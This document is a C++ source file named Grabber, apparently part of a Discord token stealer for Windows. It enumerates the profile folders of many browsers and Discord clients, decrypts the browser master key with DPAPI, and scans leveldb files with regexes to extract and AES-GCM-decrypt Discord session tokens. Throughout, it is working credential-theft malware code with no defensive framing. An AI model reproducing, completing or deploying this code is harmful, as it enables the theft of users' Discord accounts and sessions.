#include <Grabber.h>

#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <filesystem>
#include <regex>
#include <set>
#include <algorithm> 
 #include <cstring>

#include <windows.h>


#pragma comment(lib,"ws2_32.lib") 

namespace Data {

    namespace fs = std::filesystem;

    fs::path appdata = fs::path(getenv("APPDATA"));
    fs::path localappdata = fs::path(getenv("LOCALAPPDATA"));

    std::vector<std::string> browser_paths = {
        localappdata.string() + "\\Google\\Chrome\\User Data\\Default",
        appdata.string() + "\\Opera Software\\Opera GX Stable",
        localappdata.string() + "\\Torch\\User Data\\Default",
        localappdata.string() + "\\Kometa\\User Data\\Default",
        localappdata.string() + "\\Orbitum\\User Data\\Default",
        localappdata.string() + "\\CentBrowser\\User Data\\Default",
        localappdata.string() + "\\7Star\\7Star\\User Data\\Default",
        localappdata.string() + "\\Sputnik\\Sputnik\\User Data\\Default",
        localappdata.string() + "\\Vivaldi\\User Data\\Default",
        localappdata.string() + "\\Google\\Chrome SxS\\User Data\\Default",
        localappdata.string() + "\\Epic Privacy Browser\\User Data\\Default",
        localappdata.string() + "\\Microsoft\\Edge\\User Data\\Default",
        localappdata.string() + "\\uCozMedia\\Uran\\User Data\\Default",
        localappdata.string() + "\\Yandex\\YandexBrowser\\User Data\\Default",
        localappdata.string() + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        localappdata.string() + "\\Iridium\\User Data\\Default"
    };

    std::vector<std::string> discord_paths = {
        appdata.string() + "\\discord",
        appdata.string() + "\\discordptb",
        appdata.string() + "\\discordcanary",
        appdata.string() + "\\Lightcord"
    };
}
namespace Grabber {
    namespace fs = std::filesystem;

    namespace Discord {
        void getTokenDiscord(std::set<std::string>& tokens) {
            for (fs::path path : Data::browser_paths) {
                if (!fs::exists(path)) continue;
                std::string keyBeforeDecode = Utils::GetEncryptKey(path.string());
                if (keyBeforeDecode.empty()) continue;

                std::vector<BYTE> encrypted_key = Decryption::base64Decode(keyBeforeDecode);
                if (encrypted_key.size() <= 5) continue;
                encrypted_key.erase(encrypted_key.begin(), encrypted_key.begin() + 5);

                std::vector<BYTE> key = Decryption::decrypt_dpapi(encrypted_key);
                if (key.empty()) continue;

                std::string token_path = path.string() + "\\Local Storage\\leveldb\\";
                if (!fs::exists(token_path)) continue;

                std::regex token_regex(R"([-_\w]{24,26}\.[-_\w]{6}\.[-_\w]{27,38})");
                std::regex encrypted_token_regex(R"(dQw4w9WgXcQ:[^\"]*)");

                for (auto& p : fs::directory_iterator(token_path)) {
                    if (!p.is_regular_file()) continue;
                    std::string filename = p.path().filename().string();

                    if (!(Utils::ends_with(filename, ".ldb") || Utils::ends_with(filename, ".log"))) continue;

                    std::ifstream file(p.path(), std::ios::binary);
                    if (!file.is_open()) continue;

                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

                    auto matches_begin = std::sregex_iterator(content.begin(), content.end(), token_regex);
                    auto matches_end = std::sregex_iterator();

                    for (std::sregex_iterator i = matches_begin; i != matches_end; ++i) {
                        std::string found_token = (*i).str();
                        tokens.insert(found_token);
                    }

                    auto tokens_begin = std::sregex_iterator(content.begin(), content.end(), encrypted_token_regex);
                    auto tokens_end = std::sregex_iterator();

                    for (std::sregex_iterator i = tokens_begin; i != tokens_end; ++i) {
                        std::string token = (*i).str();

                        try {
                            std::string b64_part = token.substr(strlen("dQw4w9WgXcQ:"));
                            std::vector<BYTE> raw = Decryption::base64Decode(b64_part);

                            if (raw.size() < 3 + 12 + 16) {
                                continue;
                            }

                            std::vector<BYTE> nonce(raw.begin() + 3, raw.begin() + 15);
                            std::vector<BYTE> ciphertext(raw.begin() + 15, raw.end() - 16);
                            std::vector<BYTE> tag(raw.end() - 16, raw.end());

                            std::string decrypted_token = Decryption::aes_gcm_decrypt(key, nonce, ciphertext, tag);

                            if (!decrypted_token.empty()) {
                                tokens.insert(decrypted_token);
                            }
                        }
                        catch (...) {
                            continue;
                        }
                    }
                }
            }
        }

        void getTokenBrowserDiscord(std::set<std::string>& data) {
            for (fs::path path : Data::discord_paths) {
                if (!fs::exists(path)) continue;
                std::string tokensPath = path.string() + "\\Local Storage\\leveldb\\";
                if (!fs::exists(tokensPath)) continue;

                std::regex token_regex(R"([-_\w]{24,26}\.[-_\w]{6}\.[-_\w]{27,38})");

                for (auto& p : fs::directory_iterator(tokensPath)) {
                    if (!p.is_regular_file()) continue;
                    std::string name = p.path().filename().string();

                    if (!(Utils::ends_with(name, ".ldb") || Utils::ends_with(name, ".log"))) continue;

                    std::ifstream file(p.path(), std::ios::binary);
                    if (!file.is_open()) continue;

                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

                    auto matches_begin = std::sregex_iterator(content.begin(), content.end(), token_regex);
                    auto matches_end = std::sregex_iterator();

                    for (std::sregex_iterator i = matches_begin; i != matches_end; ++i) {
                        std::string token = (*i).str();
                        data.insert(token);
                    }
                }
            }
        }



	} // namespace Discord

    
}
